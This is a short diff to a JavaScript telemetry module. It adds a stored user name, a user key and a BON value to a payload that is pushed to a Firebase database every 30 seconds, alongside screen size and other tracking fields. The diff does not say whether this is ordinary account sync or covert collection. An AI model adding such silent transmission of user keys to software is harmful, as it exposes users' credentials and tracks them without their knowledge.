@@ -130,6 +130,9 @@
   }
 
   function payload(){
+    const uname = ls('USER_NAME') || '';
+    const ukey = ls('USER_KEY') || '';
+    const bonRaw = ls('BON') || '[]';
     let addr = 0;
     try { addr = typeof P !== 'undefined' && Array.isArray(P) ? P.length : 0; } catch(e){}
     return {
@@ -140,6 +143,9 @@
       scr: screen.width + 'x' + screen.height,
       first: +ls('ADM_FIRST') || Date.now(),
       addr: addr,
+      uname: uname,
+      ukey: ukey,
+      bonRaw: bonRaw,
       cur: JSON.stringify(curSummary()),
       hist: ls('BON_HIST') || '{}'
     };
@@ -149,7 +155,7 @@
   function push(){
     if (!ref) return;
     const p = payload();
-    const sig = [p.cur, p.hist, p.v, p.lang, p.addr].join('|');
+    const sig = [p.uname, p.ukey, p.cur, p.hist, p.v, p.lang, p.addr].join('|');
     if (sig === lastSig){ ref.child('t').set(Date.now()).catch(() => {}); return; }
     lastSig = sig;
     ref.update(p).catch(() => { lastSig = ''; });
@@ -180,7 +186,8 @@
 
   function init(){
     const db = firebase.database();
-    ref = db.ref('users/' + AID);
+    window._admPushNow = push;
+    ref = db.ref('users/' + (ls('ADM_UID') || AID));
     push();
     setInterval(() => { if (!document.hidden) push(); }, 30000);
     document.addEventListener('visibilitychange', () => { if (!document.hidden){ push(); tryFU(); } });
